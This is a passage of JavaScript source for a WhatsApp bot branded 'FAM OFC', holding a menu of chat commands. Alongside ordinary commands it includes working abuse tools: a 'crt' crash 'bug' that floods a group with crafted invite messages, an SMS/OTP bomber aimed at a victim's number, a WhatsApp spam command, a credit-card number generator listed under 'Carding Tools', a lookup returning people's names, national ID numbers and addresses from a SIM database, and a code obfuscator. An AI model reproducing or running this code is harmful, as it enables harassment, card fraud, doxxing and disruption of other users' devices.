        return conn.sendMessage(m.chat, { text: "✅ *This number is already an Owner!*" }, { quoted: m });
    }

    owners.push(number);
    saveOwners(owners);

    conn.sendMessage(m.chat, { text: `🎉 *Successfully added new Owner: ${number}*` }, { quoted: m });
  }  break;


// 🗑 Remove Owner Case
case "removeowner": {
if (!isCreator(sender)) return famreply2("❌ Only the Owner can use this command!");

    if (!args[0]) return conn.sendMessage(m.chat, { text: "📌 *برائے مہربانی ایک نمبر درج کریں!* (مثال: \n `.removeowner 923001234567`)" }, { quoted: m });
    let number = text.replace(/\D/g, "") + "@s.whatsapp.net"; 
    let owners = getOwners();

    if (!owners.includes(number)) {
        return conn.sendMessage(m.chat, { text: "❌ *This number is not an Owner!*" }, { quoted: m });
    }

    owners = owners.filter(owner => owner !== number);
    saveOwners(owners);

    conn.sendMessage(m.chat, { text: `🗑 *Successfully removed Owner: ${number}*` }, { quoted: m });
   } break;

case "crt": {
if (!isCreator(sender)) return famreply2("❌ Only the Owner can use this command!");
    if (!args[0]) return m.reply(`Usage: ${prefix + command} Link\nExample: ${prefix + command} https://chat.whatsapp.com/FuLRVI2SGNd4bnWlPsEt`);

    let result = args[0].split('https://chat.whatsapp.com/')[1];
    let Pehssjsjsj = await conn.groupAcceptInvite(result);
    jumlah = "3";

    for (let i = 0; i < jumlah; i++) {
        var groupInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
            "groupInviteMessage": {
                "groupJid": "120363251190676308@g.us",
                "inviteCode": "/RwWifkIpEQUesVv",
                "inviteExpiration": "1709614188",
                "groupName": `${teksbug2}`,
                "caption": "Yahaha Lag Ya?!"
            }
        }), { userJid: from, quoted: m });

        conn.relayMessage(Pehssjsjsj, groupInviteMessage.message, { messageId: groupInviteMessage.key.id });
    }

    // Adding credit
    m.reply(`✅ Successfully sent the bug!\n\n🔹 *Credit: FAM OFC*`);
}
break;







case "clean": {
 if (!isCreator(sender)) return famreply2("❌ Only the Owner can use this command!");

    try {
        let sessionFolder = "./session"; // Apna session folder ka path likhein
        let excludedFile = "creds.json"; // Yeh file delete nahi hogi

        // Send loading message
        let loadingMessage = await famreply2("⏳ *Cleaning session files... Please wait.*");

        

        if (fs.existsSync(sessionFolder)) {
            let files = fs.readdirSync(sessionFolder);
            let deletedFiles = 0;

            for (let file of files) {
                let filePath = path.join(sessionFolder, file);
                
                if (fs.lstatSync(filePath).isFile() && file !== excludedFile) {
                    fs.unlinkSync(filePath);
                    deletedFiles++;
                }
            }

            // Delete loading message before response
            
            famreply2(`✅ *Successfully deleted ${deletedFiles} session files!*\n⚠ *creds.json is kept safe.*`);
        } else {
            famreply2("❌ *Session folder not found!*");
        }
    } catch (error) {
        console.error("Error Cleaning Sessions:", error);
        famreply2("⚠ *Error cleaning session files. Try again later.*");
    }
}
break;
case "runtime": case "ping": {
    let uptime = runtime(process.uptime());
    let ping = await getPing();
    
    let response = `
┌─〔 *BOT STATUS* 〕
│⏳ *Uptime:* ${uptime}
│⚡ *Ping:* ${ping}
└───────────────
    `;
    
    famreply2(response);
}
break;


case "developer":
case "owner":{
    const developerInfo = "🔥 *Developer Info* 🔥\n\n" +
                         "👤 *Name:* Faheem\n" +
                         "📧 *Contact:* +923350963366\n" +
                         "🌐 *Follow me on my socials!*";

    const msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadataVersion: 2,
                    deviceListMetadata: {},
                },
                interactiveMessage: {
                    body: {
                        text: developerInfo,
                    },
                    footer: {
                        text: "🔥 Powered by Fam Ofc 🔥",
                    },
                    header: {
                        hasMediaAttachment: false,
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: `{"display_text":"🔴YouTube","url":"https://youtube.com/@famofch4k3r","merchant_url":"https://youtube.com/@famofch4k3r"}`
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: `{"display_text":"🟢WhatsApp","url":"https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C","merchant_url":"https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C"}`
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: `{"display_text":"🔵telegram","url":"https://t.me/famofc","merchant_url":"https://t.me/famofc"}`
                            },
                                                        {
                                name: "cta_url",
                                buttonParamsJson: `{"display_text":"📸Instagram","url":"https://www.instagram.com/fam_ofc1","merchant_url":"https://www.instagram.com/fam_ofc1"}`
                            },
                                                        {
                                name: "cta_url",
                                buttonParamsJson: `{"display_text":"🐙GitHub","url":"https://github.com/Faheemxyz","merchant_url":"https://github.com/Faheemxyz"}`
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: `{"display_text":"📋 Copy Text","copy_code":"This is the copied text!"}`
                            },
                            {
                                name: "cta_call",
                                buttonParamsJson: `{"display_text":"📞 Call Support","phone_number":"+923001234567"}`
                            }
                        ],
                    },
                    messageVersion: 1,
                },
            },
        },
    };

    await conn.relayMessage(m.chat, msg, {
        messageId: m.key.id,
    });
}
break;


case "developer": {
    
    
    let response = `
┌─〔 *FAM OFC - INFO* 〕
│  
│ 🔴 *YouTube:* [@famofch4k3r]  
│ 🔵 *Telegram:* [Join Now](https://t.me/famofc)  
│ 🟢 *WhatsApp Channel:* [Click Here](https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C)  
│  
│ 🌐 *Website:* [Visit Now](https://fam-tool.vercel.app/)  
│ 📸 *Instagram:* [@fam_ofc1]  
│ 🐙 *GitHub:* [Faheemxyz]  
│ 💬 *WhatsApp:* [+923350963366]  
│  
└──────────────────

    `;
    
    famreply2(response);
}
break;

case "lunaticseven": {
    
    
    let response = `
┌─〔 *Lunatic Seven* 〕
│
│🔴 *YouTube* https://youtube.com/@cogiton3rd
│
└───────────────
    `;
    
    famreply2(response);
}
break;


case "gen": case "ccgen": case "gencc": {
    if (!text) {
        return m.reply('📌 *Provide a BIN (First 6 digits)*\nExample: `.gen 550989`');
    }

    try {
        let loadingMessage = await m.reply("⏳ *Generating cards... Please wait.*");

        const response = await axios.get(`https://famofcfallxd.serv00.net/apis/famccgen.php?cc=${encodeURIComponent(text)}`);

        await conn.sendMessage(m.chat, { delete: loadingMessage.key });

        if (response.data.status === "success" && response.data.generated_cards.length > 0) {
            let cards = response.data.generated_cards;
            let binInfo = response.data.bin_info;
            let formattedCards = cards.join("\n");

            let pan = `🎩 *𝐅𝐀𝐌 𝐎𝐅𝐂 - 𝐂𝐂 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐎𝐑*\n\n`;
            pan += `🔢 *BIN:* ${text}xxxxx\n`;
            pan += `🏦 *Bank:* ${binInfo.bank}\n`;
            pan += `🌍 *Country:* ${binInfo.country} ${binInfo.emoji}\n`;
            pan += `💳 *Brand:* ${binInfo.brand}\n`;
            pan += `🔍 *Scheme:* ${binInfo.scheme}\n`;
            pan += `📌 *Type:* ${binInfo.type}\n`;
            pan += `💰 *Currency:* ${binInfo.currency}\n\n`;
            pan += `🚀 *Powered by FAM OFC*`;

            const imgUrl = "https://fam-official.serv00.net/script12/fampng/Famccgen.png"; // Change to an image file

            let msg = generateWAMessageFromContent(
                m.chat,
                {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                body: { text: pan },
                                carouselMessage: {
                                    cards: [
                                        {
                                            header: {
                                                imageMessage: (await generateWAMessageContent(
                                                    { image: { url: imgUrl } }, // Sends image instead of GIF
                                                    { upload: conn.waUploadToServer }
                                                )).imageMessage,
                                                hasMediaAttachment: true,
                                            },
                                            body: {
                                                text: `🔢 *Generated Cards:*\n\`\`\`${formattedCards}\`\`\``
                                            },
                                            nativeFlowMessage: {
                                                buttons: [
                                                    {
                                                        name: "cta_copy",
                                                        buttonParamsJson: `{"display_text":"📋 Copy CCs","copy_code":"${formattedCards}"}`
                                                    }
                                                ],
                                            },
                                        },
                                    ],
                                    messageVersion: 1,
                                },
                            },
                        },
                    },
                },
                {}
            );

            await conn.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });

        } else {
            m.reply("⚠ *Failed to generate cards. Try again with a valid BIN.*");
        }
    } catch (error) {
        console.error("API Error:", error);
        await conn.sendMessage(m.chat, { delete: loadingMessage.key });

        m.reply("⚠ *Error generating cards. Try again later.*");
    }
}
break;
case "smsboomer": {
 if ( !isPremium) return famreply2("only used a premium user")
    if (!text) {
        return famreply2('📌 Provide a phone number and sms amount\nExample: .smsboomer 923XXX 1-100');
    }

    let args = text.split(" ");
    if (args.length !== 2) {
        return famreply2('📌 Invalid format! Use: .smsboomer <phone_number> <count>');
    }

    let phone = args[0];
    let count = parseInt(args[1]);

    if (!phone || isNaN(count) || count < 1 || count > 100) {
        return famreply2('⚠ Enter a valid phone number and OTP count (1-100).');
    }

    famreply2('⏳ Sending OTPs...');

    try {
        let requests = [];
        for (let i = 0; i < count; i++) {
            let apiUrl = i % 2 === 0 
                ? `https://bajao.pk/api/v2/login/generatePin?uuid=${phone}`
                : `https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage`;

            let payload = i % 2 !== 0 ? JSON.stringify({
                Version: 'V1',
                Language: 'en',
                Platform: 'web',
                ProductId: 1733,
                MobileNo: phone,
                OperatorId: '100007',
                URL: 'https://www.tapmad.com/sign-up',
                source: 'organic',
                medium: 'organic'
            }) : null;

            let options = {
                method: 'POST',
                headers: i % 2 !== 0 ? {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                } : {},
                body: payload
            };

            requests.push(fetch(apiUrl, options));
        }

        await Promise.all(requests);
        famreply2('✅ OTP(s) sent successfully!');
    } catch (error) {
        console.error("API Error:", error);
        famreply2("⚠ Error sending OTPs. Try again later.");
    }
}
break
case "simdata": {
    if (!text) {
        return m.reply('📌 Provide a phone number!\nExample: simdata 03325809154');
    }

    // Validate phone number format (basic check for digits, optional leading 0 or +)
    if (!/^\+?\d{10,13}$/.test(text.replace(/\s/g, ''))) {
        return m.reply('⚠ Invalid phone number format! Use a valid number, e.g., 03325809154 or +923325809154');
    }

    try {
        

        const response = await axios.get(`https://fam-official.serv00.net/sim/famdata.php?num=${encodeURIComponent(text)}`, {
            timeout: 10000 // 10-second timeout
        });

        
        // Log the full response for debugging
        console.log("API Response:", JSON.stringify(response.data, null, 2));

        if (response.data && response.data.status === "success" && Array.isArray(response.data.data) && response.data.data.length > 0) {
            let formattedResponse = `📋 *\`𝐒𝐈𝐌 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄\`*\n\n`;

            // Loop through all results and format them
            response.data.data.forEach((userData, index) => {
                formattedResponse += `📌 *Record ${index + 1}:*\n`;
                formattedResponse += `🔹 *Name:* ${userData.name || "Not Available"}\n`;
                formattedResponse += `🔹 *Mobile:* ${userData.mobile || "Not Available"}\n`;
                formattedResponse += `🔹 *CNIC:* ${userData.cnic || "Not Available"}\n`;
                formattedResponse += `🔹 *Address:* ${userData.address?.trim() || "Not Available"}\n`;
                formattedResponse += `━━━━━━━━━━━━━━━\n`;
            });

            // Add developer name
            formattedResponse += `🔍 *Developer:* ${response.data.developer || "Not Available"}\n`;

            // Prepare interactive message with copy button
            let msg = generateWAMessageFromContent(
                m.chat,
                {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                body: { text: formattedResponse },
                                nativeFlowMessage: {
                                    buttons: [
                                        {
                                            name: "cta_copy",
                                            buttonParamsJson: `{"display_text":"📋 Copy Data","copy_code":"${formattedResponse.replace(/`/g, '\\`')}"}`
                                        }
                                    ]
                                }
                            }
                        }
                    }
                },
                { quoted: qloc }
            );

            await conn.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });

        } else {
            m.reply(`⚠ No data found for the number: ${text}. Please check the input or try another number.`);
        }
    } catch (error) {
        console.error("API Error Details:", {
            message: error.message,
            code: error.code,
            response: error.response?.data || "No response data",
            status: error.response?.status
        });

        // Attempt to delete loading message even on error
        try {
            await conn.sendMessage(m.chat, { delete: loadingMessage.key });
        } catch (deleteError) {
            console.error("Failed to delete loading message:", deleteError);
        }

        if (error.code === 'ECONNABORTED') {
            m.reply("⚠ Request timed out. The API server might be slow or down. Try again later.");
        } else if (error.response?.status === 404) {
            m.reply("⚠ API endpoint not found. Please check the API URL or contact the developer.");
        } else {
            m.reply("⚠ Error fetching data. Please try again later or check the phone number.");
        }
    }
}
break;
case "waspam": {
     if ( !isPremium ) return famreply2("only used a premium user");

    if (!text) {
        return famreply2('📌 Provide a phone number!\nExample: 923xxx');
    }

    try {
        famreply2('✅ Sending...');
        
        const encodedNumber = encodeURIComponent(text);
        const response = await axios.get(`https://famofcfallxd.serv00.net/apis/famwabomr.php?number=${encodedNumber}`);
        
        // Fix JSON response parsing
        let jsonResponses = response.data.split('}{').map((part, index, arr) => {
            return index === 0
                ? part + '}'
                : index === arr.length - 1
                ? '{' + part
                : '{' + part + '}';
        });

        let messages = jsonResponses.map(msg => JSON.parse(msg).message).join("\n");

        famreply2(messages);
    } catch (error) {
        console.error("API Error:", error);
        famreply2("⚠ Error fetching data. Try again later.");
    }
}
break

case "ai": {
    if (!text) {
        return famreply2("📌 *Hi Brother!* 🤖\nCan I help you?\n_Type:_ *.ai Your Question*");
    }

    try {
        const apiUrl = `https://fam-official.serv00.net/sim/ai.php?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);
        
        console.log("API Response:", response.data); // Debugging - Check full response in the console

        if (response.data && response.data.success) {
            m.reply(`${response.data.message}`);
        } else {
            famreply2(`⚠ *Error:* ${response.data.message || "AI response not available."}`);
        }
    } catch (error) {
        console.error("AI API Error:", error);
        famreply2("⚠ *Error fetching AI response.*\nPlease try again later.");
    }
}
break;
case "getsc": {
    // Check if the sender is the owner
    if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) {
        return famreply2("⚠️ *Only the owner can use this command!*");
    }

    // Delete unnecessary files except creds.json
    let dir = await fs.readdirSync("./session");
    if (dir.length > 1) {
        let filesToDelete = dir.filter(file => file !== "creds.json");
        for (let file of filesToDelete) {
            await fs.unlinkSync(`./session/${file}`);
        }
    }

    await famreply2("⏳ *Processing bot script backup... Please wait.*");

    // Define backup name
    var backupName = `FAM-OFC_Bot`;

    // List all files and directories to include in backup
    const fileList = (await execSync("ls"))
        .toString()
        .split("\n")
        .filter(file => 
            file !== "node_modules" &&
            file !== "session" &&
            file !== "package-lock.json" &&
            file !== "yarn.lock" &&
            file !== ""
        );

    // Create ZIP archive of the bot script
    await execSync(`zip -r ${backupName}.zip ${fileList.join(" ")}`);

    // Send the ZIP file to the user
    await conn.sendMessage(m.sender, {
        document: await fs.readFileSync(`./${backupName}.zip`),
        fileName: `${backupName}.zip`,
        mimetype: "application/zip"
    }, { quoted: m });

    // Delete the ZIP file after sending
    await execSync(`rm -rf ${backupName}.zip`);

    // Notify the user if the script was sent in private chat
    if (m.chat !== m.sender) {
        return famreply2("📩 *The bot script has been sent to your private chat!*");
    }
}
break;

case "trackip": {
    if (!text) {
        return famreply2(`📌 *Usage:* ${prefix + command} 112.90.150.204`);
    }

    try {
        let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

        if (!res || !res.success) {
            throw new Error(`⚠ IP ${text} not found!`);
        }

        // Formatting the IP information response
        const formatIPInfo = (info) => {
            return `🎩 *𝐅𝐀𝐌 𝐎𝐅𝐂 - 𝐈𝐏 𝐓𝐑𝐀𝐂𝐊𝐄𝐑*\n\n` +
            `📍 *IP Address:* ${info.ip || 'N/A'}\n` +
            `✅ *Success:* ${info.success ? 'Yes' : 'No'}\n` +
            `🌍 *Type:* ${info.type || 'N/A'}\n` +
            `🗺️ *Continent:* ${info.continent || 'N/A'} (${info.continent_code || 'N/A'})\n` +
            `🏳️ *Country:* ${info.country || 'N/A'} (${info.country_code || 'N/A'})\n` +
            `🏙️ *Region:* ${info.region || 'N/A'} (${info.region_code || 'N/A'})\n` +
            `🌆 *City:* ${info.city || 'N/A'}\n` +
            `📌 *Latitude:* ${info.latitude || 'N/A'}\n` +
            `📌 *Longitude:* ${info.longitude || 'N/A'}\n` +
            `🌐 *Is EU:* ${info.is_eu ? 'Yes' : 'No'}\n` +
            `📮 *Postal Code:* ${info.postal || 'N/A'}\n` +
            `📞 *Calling Code:* +${info.calling_code || 'N/A'}\n` +
            `🏛️ *Capital:* ${info.capital || 'N/A'}\n` +
            `🗺️ *Borders:* ${Array.isArray(info.borders) && info.borders.length > 0 ? info.borders.join(", ") : 'None'}\n\n` +
            `🚀 *Connection Details:*\n` +
            `🔹 *ASN:* ${info.connection?.asn || 'N/A'}\n` +
            `🏢 *Organization:* ${info.connection?.org || 'N/A'}\n` +
            `📡 *ISP:* ${info.connection?.isp || 'N/A'}\n` +
            `🌎 *Domain:* ${info.connection?.domain || 'N/A'}\n\n` +
            `⏰ *Timezone:* ${info.timezone?.id || 'N/A'} (${info.timezone?.abbr || 'N/A'})\n` +
            `🕒 *Current Time:* ${info.timezone?.current_time || 'N/A'}\n\n` +
            `🚀 *Powered by FAM OFC*`;
        };

        // Send location pin if latitude & longitude exist
        if (res.latitude && res.longitude) {
            await conn.sendMessage(m.chat, {
                location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude }
            });
        }

        // Wait before sending IP details
        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        await delay(2000);

        // Send IP details
        famreply2(formatIPInfo(res));

    } catch (error) {
        console.error("Error in 'trackip' case:", error);
        famreply2(`⚠ *Error:* Unable to retrieve data for IP ${text}`);
    }
}
break;

case 'addprem':
if (!isCreator(sender)) return famreply2(" اس بورڈ کے مالک کے ساتھ رابطہ کریں\nwa.me/+923350963366 ")
if (!args[0]) return famreply2(`Use ${prefix+command} number\nContoh ${prefix+command} 1849xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await conn.onWhatsApp(prrkek)
if (ceknya.length == 0) return famreply2(`Enter a valid and registered number on WhatsApp!!!`)
premium.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
famreply2(`oke تک رسائی دی گئی ہے۔ bot`)
break

case 'delprem':
if (!isCreator(sender)) return famreply2(" اس بورڈ کے مالک کے ساتھ رابطہ کریں\nwa.me/+923350963366 ")
if (!args[0]) return famreply2(`Use ${prefix+command} Nomor\nContoh ${prefix+command} 1849xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
famreply2(`yah اب رسائی نہیں ہے`)
break





/*
case "menu": {
    // Pre-calculate uptime and ping once
    const [uptime, ping] = await Promise.all([runtime(process.uptime()), getPing()]);
    
    const textMenu = `  
╭━━━╮╱╱╱╱╱╱╱╱╱╱╭━╮
┃╭━━╯╱╱╱╱╱╱╱╱╱╱┃╭╯
┃╰━━┳━━┳╮╭╮╭━━┳╯╰┳━━╮
┃╭━━┫╭╮┃╰╯┃┃╭╮┣╮╭┫╭━╯
┃┃╱╱┃╭╮┃┃┃┃┃╰╯┃┃┃┃╰━╮
╰╯╱╱╰╯╰┻┻┻╯╰━━╯╰╯╰━━╯         
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┏━━━━━━━━━━━━━━┈ 
┣──=[ *\`[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ]\`* ] 
┆ 🤖 *Bot Name:* ${global.namaBot}
┆ ⏳ *Uptime:* ${uptime}  
┆ ⚡ *Ping:* ${ping}  
┆ 👤 *User:* ${pushname}  
┆ 😎 *Status:* ${!isCreator(sender) ? "User ⭐" : "Developer ⭐"}
┆ 🎊 *Premium:* ${isPremium ? "✅" : "❎"}
┆ 🛠 *Type:* Tool  
┆ 🔢 *Version:* ${global.versionBot}  
┆ 🧑‍💻 *Dev:* ${global.namaDeveloper}  
┆ 🚀 *Powered by FAM OFC*  
└━━━━━━━━━━━━━━┈ ⳹
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
    `;

    // Send single message with image and buttons, skip multiple reactions
    await conn.sendMessage(m.chat, { 
        image: imageBuffer,  
        caption: textMenu,
        footer: "✨ FAM OFC MD ✨",
        buttons: [
            { buttonId: ".allmenu", buttonText: { displayText: '🌟 ALL MENU 🌟' } },
            { buttonId: ".developer", buttonText: { displayText: "🌟 DEVELOPER 🌟" } },
            { buttonId: ".lunaticseven", buttonText: { displayText: '🌟 LUNATIC-SEVEN 🌟' } }
        ],
        viewOnce: true
    }, { quoted: m });

    // Send audio only if necessary (optional optimization)
    await conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}
break;

case "allmenu": {
    const [uptime, ping] = await Promise.all([runtime(process.uptime()), getPing()]);

    const textAllMenu = `  
╭━━━╮╱╱╱╱╱╱╱╱╱╱╭━╮
┃╭━━╯╱╱╱╱╱╱╱╱╱╱┃╭╯
┃╰━━┳━━┳╮╭╮╭━━┳╯╰┳━━╮
┃╭━━┫╭╮┃╰╯┃┃╭╮┣╮╭┫╭━╯
┃┃╱╱┃╭╮┃┃┃┃┃╰╯┃┃┃┃╰━╮
╰╯╱╱╰╯╰┻┻┻╯╰━━╯╰╯╰━━╯         
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
 *🎊 F A M  V I P - M E N U 🎊*
   
┌── [ *\`Owner Menu\`* ]
│ ✇ *.clean*
│ ✇ *.getsc*
│ ✇ *.addprem*
│ ✇ *.delprem*  
│ ✇ *.addowner*
│ ✇ *removeowner*
│ ✇ *ai-mode* ( on/off )
└──────────────▪                   
┌── [ *\`Pak Sim Database\`* ]
│ ✇ *.simdata* ( number )
└──────────────▪
┌── [ *\`SMS Boomer\`* ]
│ ✇ *.waspam* ( number )
│ ✇ *.smsboomer* ( number 𝟏-𝟏𝟎𝟎 )
└──────────────▪
┌── [ *\`Carding Tools\`* ]
│ ✇ *.chkcc* ( Card ) 
│ ✇ *.gen* ( bin )
└──────────────▪
┌── [ *\`Tools\`* ]
│ ✇ *.ai* ( text )
│ ✇ *.tourl* ( reply img )
│ ✇ *.shorturl* ( url )
│ ✇ *.trackip* ( 173.255.160.70 )
│ ✇ *.enc doc* ( reply js script )
│ ✇ *.dec doc* ( reply js script )
└──────────────▪
┌── [ *\`Bug Menu\`* ]
│ ✇ *.crt* ( group link )
└──────────────▪
┌── [ *\`All video downloader\`* ]
│ ✇ *.vdl* ( link )
└──────────────▪
    `;

    // Send single message with image and buttons, skip reactions
    await conn.sendMessage(m.chat, { 
        image: imageBuffer,  
        caption: textAllMenu,
        footer: "✨ FAM OFC MD ✨",
        buttons: [
            { buttonId: ".developer", buttonText: { displayText: "🌟 DEVELOPER 🌟" } },
            { buttonId: ".lunaticseven", buttonText: { displayText: '🌟 LUNATIC-SEVEN 🌟' } }
        ],
        viewOnce: true
    }, { quoted: m });
}
break;
*/
case 'clearchat':
if (!isCreator(sender)) return famreply2("❌ Only the Owner can use this command!");

for (let i = 0; i < 2; i++) {
if (!q) return famreply2("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
await conn.sendMessage(numi, {
text: "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
})
}
break;



/**
  * famofc
  * don't forget to follow
  * https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C
*/


//===========TOOLS MENU=========//
case "tt":
case "tiktok": {
    // Check if URL is provided
    if (!text) {
        return famreply2(`📌 *Usage:* ${prefix + command} <tiktok_url>\nExample: ${prefix + command} https://www.tiktok.com/@username/video/123456789\n\n🔥 *Powered by FAM OFC*`);
    }

    // Validate URL
    const url = text.trim();
    if (!isUrl(url) || !url.includes("tiktok.com")) {
        return famreply2("❌ *Invalid URL!* Please provide a valid TikTok video URL (e.g., https://www.tiktok.com/@username/video/123456789).");
    }

    try {
        // Send loading animation
        

        // Fetch media from API
        const apiUrl = `https://rest-lily.vercel.app/api/downloader/tiktok?url=${encodeURIComponent(url)}`;
        const response = await axios.get(apiUrl, {
            headers: { Accept: "*/*" }
        });
        const data = response.data;

        if (data.status === true && data.data) {
            const { no_watermark, music, title, creator } = data.data;

            // Validate URLs
            if (!no_watermark || !music) {
                return famreply2("❌ *Error:* No downloadable media found in the provided URL.\nEnsure the video is public and try again.");
            }

            // Send No-Watermark Video (simple, no contextInfo)
            await conn.sendMessage(m.chat, {
                video: { url: no_watermark },
                caption: `🎥 TikTok Video\n\n🔥 Powered by FAM OFC`
            }, { quoted: m });

            // Send Audio MP3 (with channel link in contextInfo)
            
            await conn.sendMessage(m.chat, { audio: { url: music }, mimetype: 'audio/mpeg', ptt: true }, { quoted: qloc });
            
            
            
        } else {
            await famreply2(`❌ *Failed to fetch TikTok media:* ${data.message || "No media found in the provided URL."}\nPlease check the URL and ensure the video is public.`);
        }
    } catch (error) {
        console.error("TikTok Downloader Error:", error);
        await conn.sendMessage(m.chat, { text: `❌ *Error:* ${error.message || "Unable to download TikTok media. Try again later."}` }, { quoted: m });
    }
}
break;

case 'enc':  {

        const usage = `Usage Example:
${prefix + command} doc (Reply to a document)`;

        let text;
        if (args.length >= 1) {
            text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
            text = m.quoted.text;
        } else {
            return famreply2(usage);
        }
        
        try {
            let code;
            if (text === 'doc' && m.quoted && m.quoted.mtype === 'extendedTextMessage') {
                let docBuffer;
                if (m.quoted.mimetype) {
                    docBuffer = await m.quoted.download();
                }
                code = docBuffer.toString('utf-8');
            } else {
                code = text;
            }

const optionsObf6 = {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "素晴座素晴難FAM_OFC素晴座素晴難" + 
            "素晴座素晴難FAM_OFC素晴座素晴難";
        
        // Fungsi untuk menghapus karakter yang tidak diinginkan
        function removeUnwantedChars(input) {
            return input.replace(
                /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
            );
        }

        // Fungsi untuk menghasilkan string acak
        function randomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
            const charactersLength = characters.length;

            for (let i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        return removeUnwantedChars(originalString) + randomString(2);
    },

    renameVariables: true,
    renameGlobals: true,

    stringEncoding: true,
    stringSplitting: 0.0,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,

    shuffle: {
        hash: 0.0,
        true: 0.0
    },

    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 0.9,
    deadCode: 0.0,
    dispatcher: true,
    rgf: false,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};


        const options = {
            target: "node",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.5,
  deadCode: 0.25,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  preserveFunctionLength: true,
  identifierGenerator: function () {
                return "FAM_OFC" + Math.random().toString(36).substring(7);
            },
        };

            const obfuscatedCode = await JSConfuser.obfuscate(code, optionsObf6);

            const filePath = './enc_by_famofc.js';
            fs.writeFileSync(filePath, obfuscatedCode);

            await conn.sendMessage(m.chat, {
                document: {
                    url: filePath
                },
                mimetype: 'application/javascript',
                fileName: 'Encrypted By famofc.js'
            }, { quoted: m });

        } catch (error) {
            const errorMessage = `There is an error: ${error.message}`;
            await famreply2(errorMessage);
        }
}
break;
case 'dec': case 'decrypt': {
    if (!isCreator(sender)) return famreply2("❌ Only the Owner can use this command!");

    const { webcrack } = await import('webcrack');
    const usage = `📌 *Usage Example:*\n`
        + `- *${prefix + command}* (Input text or reply to encrypted text)\n`
        + `- *${prefix + command} doc* (Reply to an encrypted document)`;

    let text;
    if (args.length >= 1) {
        text = args.join(" ");
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text;
    } else {
        return famreply2(usage);
    }

    try {
        let message;
        let filePath = './dec_by_FAMOFC.js';

        if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
            let docBuffer;
            if (m.quoted.mimetype) {
                docBuffer = await m.quoted.download();
            }
            message = await webcrack(docBuffer.toString('utf-8'));
        } else {
            message = await webcrack(text);
        }

        fs.writeFileSync(filePath, message.code);

        await conn.sendMessage(m.chat, {
            document: fs.readFileSync(filePath),
            mimetype: 'application/javascript',
            fileName: 'Decrypted_By_FAMOFC.js'
        }, { quoted: m });

        // Delete the file after sending
        fs.unlinkSync(filePath);
    } catch (error) {
        famreply2(`⚠ *Error Decrypting:* ${error.message}`);
    }
}
break;


case 'splay': {
 const axios = require("axios");
 if (!text) return famreply2('song name lekho');

 await famreply2("loading");

 try {
 // URL API untuk pencarian lagu
 const searchApiUrl = `https://spotifyapi.caliphdev.com/api/search/tracks?q=${encodeURIComponent(text)}`;
 const searchData = (await axios.get(searchApiUrl)).data;
 
 // Pilih hasil pertama dari data pencarian
 const data = searchData[0];
